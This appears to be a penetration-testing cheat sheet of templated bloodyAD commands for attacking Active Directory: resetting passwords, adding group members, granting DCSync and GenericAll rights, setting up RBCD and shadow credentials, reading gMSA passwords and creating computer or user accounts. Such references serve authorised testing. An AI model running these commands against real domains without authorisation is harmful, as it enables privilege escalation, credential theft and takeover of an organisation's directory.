# bloodyAD

#bloodyAD
## bloodyAD - set user password
```
bloodyAD --host <dc_fqdn> -d <domain> -u <user> <auth>  set password "<target_user>" '<new-password|Password123!>'
```

## bloodyAD - add group member
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add groupMember "<target-group>" "<trustee|$USER>"
```

## bloodyAD - set user spn
```
bloodyAD --host <dc_fqdn> -d <domain> -u <user> <auth>  set object "<target_user>" servicePrincipalName -v "<service>/<target-host|$DC_HOST>"
```

## bloodyAD - set user attribute
```
bloodyAD --host <dc_fqdn> -d <domain> -u <user> <auth>  set object "<target_user>" <attribute> -v '<value>'
```

## bloodyAD - read gmsa password
```
bloodyAD --dc-ip <target_ip> --host <dc_fqdn> -d <domain> -u <user> <auth>  get object "<target_user>" --attr msDS-ManagedPassword
```

## bloodyAD - get writable
```
bloodyAD --dc-ip <target_ip> --host <dc_fqdn> -d <domain> -u <user> <auth>  get writable
```

## bloodyAD - get object
```
bloodyAD --dc-ip <target_ip> --host <dc_fqdn> -d <domain> -u <user> <auth>  get object "<target-object>"
```

## bloodyAD - get trusts
```
bloodyAD --dc-ip <target_ip> --host <dc_fqdn> -d <domain> -u <user> <auth>  get trusts --transitive
```

## bloodyAD - set owner
```
bloodyAD --dc-ip <target_ip> --host <dc_fqdn> -d <domain> -u <user> <auth>  set owner "<target-object>" "<trustee>"
```

## bloodyAD - add computer
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add computer <hostname> <computer-password|Password123!>
```

## bloodyAD - add dcsync
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add dcsync <target_user>
```

## bloodyAD - add genericAll
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add genericAll "<target_user>" "<trustee>"
```

## bloodyad - add rbcd
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add rbcd "<target-object>" "<service-account>"
```

## bloodyad - add dnsRecord
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add dnsRecord "<dns_name>" "<dns_data>"
```

## bloodyAD - add shadow credential
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add shadowCredentials <target_user>
```

## bloodyAD - add uac
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add uac <target_user> -f <property>
```

## bloodyAD - remove uac
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  remove uac "<target_user>" -f <property>
```

## bloodyAD - add user
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  add user <username> <new-password|Password123!>
```

#bloodyAD #ldap
## bloodyAD - ldap query
```
bloodyAD --host <dc_fqdn> -u <user> <auth> -d <domain>  get search --filter "(<query>)" --attr "<attribute|*>" 
```

